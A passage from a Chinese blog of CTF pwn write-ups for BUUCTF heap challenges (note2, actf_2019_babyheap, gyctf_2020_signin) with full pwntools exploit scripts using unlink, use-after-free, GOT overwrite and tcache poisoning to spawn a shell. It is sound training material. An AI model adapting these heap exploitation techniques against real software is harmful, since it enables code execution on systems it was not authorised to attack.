src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/10.png" class=""><h5 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/11.png" class=""><p>free掉之后清零了，不存在uaf，我们的目的是劫持刚刚的堆块表，这里没有uaf，堆块大小也限制了，考虑用unlink</p><h4 id="0x02-解题思路-1"><a href="#0x02-解题思路-1" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><p>1.布置堆风水，为unlink做铺垫</p><p>2.unlink使得ptr[0] = ptr[0] - 0x18</p><p>3.修改堆指针为atoi@got，show它泄露libc地址</p><p>4.修改atoi@got为system@got</p><h4 id="0x03-完整EXP-1"><a href="#0x03-完整EXP-1" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;note2&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;25066&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 128)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the note content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,chioce,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(chioce))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your name:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your address:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line">fake_fd = ptr - <span class="number">0x18</span></span><br><span class="line">fake_bk = ptr - <span class="number">0x10</span></span><br><span class="line">fake_content0 = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xa1</span>)+p64(fake_fd)+p64(fake_bk)</span><br><span class="line">add(<span class="number">0x80</span>,fake_content0)</span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;atoi_addr : &#x27;</span> + <span class="built_in">hex</span>(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr : &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-总结-1"><a href="#0x04-总结-1" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><h5 id="1-unlink注意事项"><a href="#1-unlink注意事项" class="headerlink" title="1.unlink注意事项"></a>1.unlink注意事项</h5><p>刚开始对这个payload匪夷所思</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br></pre></td></tr></table></figure><p><strong>向后合并</strong>的源码如下</p><ul><li><p>我们发现它首先会判断<strong>prev_inuse</strong>是否为0，而在此题目中的堆块是fastbin范畴的堆块，所以当它被free的时候并不会把<strong>prev_inuse</strong>置为0，需要我们手动置零</p></li><li><p>将<strong>prev_size</strong>拿出来加上它本来的大小变成它unlink结束之后堆块的大小</p></li><li><p>根据当前的chunk的<strong>prev_size</strong>来获取到前一个堆块的指针（这里的向后合并其实是向低地址合并</p></li><li><p>开始unlink~</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line"></span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然复习到向后合并，那就…</p><p><strong>向前合并</strong>的源码</p><p>和向后合并相比，向前合并的源码就简单一些</p><ul><li>先会判断是不是和top chunk相邻，相邻就合并了</li><li>如果nextinuse是1就修改它的prev_inuse为0</li><li>unlink完事之后把size改为合并后的size</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="actf-2019-babyheap"><a href="#actf-2019-babyheap" class="headerlink" title="actf_2019_babyheap"></a>actf_2019_babyheap</h3><h4 id="0x00-基本信息-2"><a href="#0x00-基本信息-2" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/14.png" class=""><h4 id="0x01-IDA分析-2"><a href="#0x01-IDA分析-2" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><p>先看看free函数</p><h5 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/15.png" class=""><p>经典uaf</p><h5 id="create函数"><a href="#create函数" class="headerlink" title="create函数"></a>create函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/16.png" class=""><p>经典之不能再经典</p><h5 id="print函数"><a href="#print函数" class="headerlink" title="print函数"></a>print函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/16.jpg" class=""><p>留了一个后门函数，直接执行内容，在初始化的时候我们看到了system函数</p><h4 id="0x02-解题思路-2"><a href="#0x02-解题思路-2" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><h4 id="0x03-完整EXP-2"><a href="#0x03-完整EXP-2" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;ACTF_2019_babyheap&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26654</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ACTF_2019_babyheap&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,payload</span>):</span>                                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input size: \n&quot;</span>,<span class="built_in">str</span>(size))      </span><br><span class="line">    io.sendafter(<span class="string">&quot;Please input content: \n&quot;</span>,payload)         </span><br><span class="line">                                                             </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span>                                           </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input list index: \n&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">                                                             </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_this</span>(<span class="params">index</span>):</span>                                       </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input list index: \n&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>,p64(<span class="number">0x602010</span>) + p64(elf.symbols[<span class="string">&quot;system&quot;</span>]))<span class="comment">#0x602010是/bin/sh</span></span><br><span class="line">print_this(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a>gyctf_2020_signin</h3><h4 id="0x00-基本信息-3"><a href="#0x00-基本信息-3" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/17.png" class=""><p>题目描述是在ubuntu18里面的，所以有tache机制</p><h4 id="0x01-IDA分析-3"><a href="#0x01-IDA分析-3" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><h5 id="del函数"><a href="#del函数" class="headerlink" title="del函数"></a>del函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/18.png" class=""><p>虽然把flags清零了，但是ptrlist没有清零</p><h5 id="add函数-1"><a href="#add函数-1" class="headerlink" title="add函数"></a>add函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/19.png" class=""><p>只能分配0xF个chunk，有个ptrlist存在bss段上</p><h5 id="edit函数-1"><a href="#edit函数-1" class="headerlink" title="edit函数"></a>edit函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/20.png" class=""><p>cnt是一个全局变量，值为1，所以edit函数只能eait一次，一开始想劫持tache不过只能只能edit一次</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/21.jpg" class=""><h5 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/22.png" class=""><p>calloc一下就判断ptr的值是否为0，不为0就起一个shell，ptr是bss段上的一个变量</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/23.jpg" class=""><h4 id="0x02解题思路"><a href="#0x02解题思路" class="headerlink" title="0x02解题思路"></a>0x02解题思路</h4><ol><li>分配8个chunk并free掉，会有一个chunk进入fastbin</li><li>add回来一个chunk</li><li>修改fastbin中的堆块的fd</li><li>执行后门函数</li></ol><h4 id="0x03-完整EXP-3"><a href="#0x03-完整EXP-3" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;gyctf_2020_signin&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;gyctf_2020_signin&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="comment"># io.recvuntil(&#x27;Content: &#x27;)</span></span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line">payload = p64(<span class="number">0x4040C0</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h4><h5 id="1-calloc分配堆块机制"><a href="#1-calloc分配堆块机制" class="headerlink" title="1.calloc分配堆块机制"></a>1.calloc分配堆块机制</h5><p>calloc分配堆块<strong>是不会从tache里面获取堆块的，在calloc的时候会从fastbin里面拿堆块，并且当它去取堆块的时候会把fastbin剩余的堆块放到tache里面</strong></p><p>实验一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line">    <span class="comment">//fastbin</span></span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/24.png" class=""><p>在tache bin attack中也实验过了，malloc只有当tache中的bin分配完了之后才会把fastbin里面的堆块拿到tache里面，calloc不一样啊！！！</p><p>明白了这一点就很简单了直接<strong>tcache poisoning</strong>改到ptr-0x10的位置，之后触发后门函数就可以getshell了！</p><h3 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h3><h4 id="0x00-基本信息-4"><a href="#0x00-基本信息-4" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/25.png" class=""><p>保护全开不说，还多了一个FORTIFY，这是个啥？</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/26.png" class=""><p>就是说定义此宏会导致执行一些轻量级检查，以在使用各种字符串和内存操作函数（例如<code>memcpy</code>，<code>memset</code>、<code>stpcpy</code>、<code>strcpy</code>、<code>strncpy</code>、<code>strcat</code>、<code>strncat</code>、<code>sprintf</code>、<code>snprintf</code>、<code>vsprintf</code>、 <code>vsnprintf</code>、<code>gets</code>、 及其宽字符变体）时检测一些缓冲区溢出错误</p><p>比如printf就变成了printf_chk，它将可以检查格式化字符串漏洞的特殊字符，就像下面这样</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/27.png" class=""><h4 id="0x01-IDA分析-4"><a href="#0x01-IDA分析-4" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/28.jpg" 